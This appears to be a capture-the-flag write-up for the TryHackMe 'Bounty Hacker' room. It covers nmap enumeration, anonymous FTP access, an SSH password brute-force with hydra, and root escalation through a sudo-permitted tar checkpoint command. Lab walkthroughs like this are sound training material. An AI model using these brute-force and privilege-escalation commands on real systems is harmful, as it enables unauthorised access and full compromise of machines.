
# TryHackMe: Bounty Hacker 🕵️‍♂️

## Overview

**Bounty Hacker** is a beginner-friendly Capture The Flag (CTF) room on [TryHackMe](https://tryhackme.com/room/cowboyhacker) that simulates a real-world penetration test on a compromised system. The goal is to gain initial access, enumerate, escalate privileges, and retrieve both `user.txt` and `root.txt` flags.

- **Platform**: TryHackMe
- **Difficulty**: Easy
- **Category**: Linux, Enumeration, Privilege Escalation, FTP, SSH
- **Machine IP**: `10.10.90.250`

---

## Objectives

✅ Perform enumeration using Nmap  
✅ Access files via Anonymous FTP  
✅ Crack SSH credentials  
✅ Escalate privileges using misconfigured sudo permissions  
✅ Retrieve `user.txt` and `root.txt` flags

---

## Tools Used

- `nmap` – for port scanning and service enumeration  
- `ftp` – to connect to FTP server  
- `hydra` – for brute-forcing SSH credentials  
- `tar` – for privilege escalation via sudo  
- `mousepad/cat` – for file inspection  

---

## Walkthrough

### 🔍 Enumeration

```bash
nmap -T5 -p- -vv -Pn -sV 10.10.90.250 -oA nmap
```

Discovered open ports:
- **21/tcp** - FTP (vsftpd 3.0.3)
- **22/tcp** - SSH (OpenSSH 7.2p2)
- **80/tcp** - HTTP (Apache 2.4.18)

FTP allowed **anonymous login**.

---

### 📁 FTP Anonymous Access

```bash
ftp 10.10.90.250
# Login as 'anonymous'
get locks.txt
get task.txt
```

Downloaded wordlists containing potential passwords.

---

### 🔐 SSH Brute-Force (hydra)

Discovered user **lin** (from `task.txt`), then brute-forced using:

```bash
hydra -l lin -P locks.txt ssh://10.10.90.250
```

Successfully logged in via SSH.

---

### 👤 User Access

```bash
ssh lin@10.10.90.250
cat ~/Desktop/user.txt

```

---

### 🔝 Privilege Escalation

```bash
sudo -l
# lin can run: (root) /bin/tar
```

Exploited tar to gain root:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Got root shell!

---

### 🏁 Root Flag

```bash
cd /root
cat root.txt

```

---

## Final Notes

- This box reinforces the importance of:
  - Checking for **anonymous services**
  - Simple **brute-force + enumeration**
  - Misconfigured **sudo permissions**
- Root via `tar` is a classic Linux privilege escalation.

---



## Author

👤 **Faisal Khan**  
📂 Cybersecurity Enthusiast | CTF Player | Bug Bounty Hunter  
🔗 GitHub:  [GitHub] (https://github.com/mrfaisal607)  
🌐 TryHackMe Profile: [my Profile](https://tryhackme.com/p/mrfaisal0003)

---

> “Hacking is not just about breaking into systems, it's about learning how they work.” 🧠
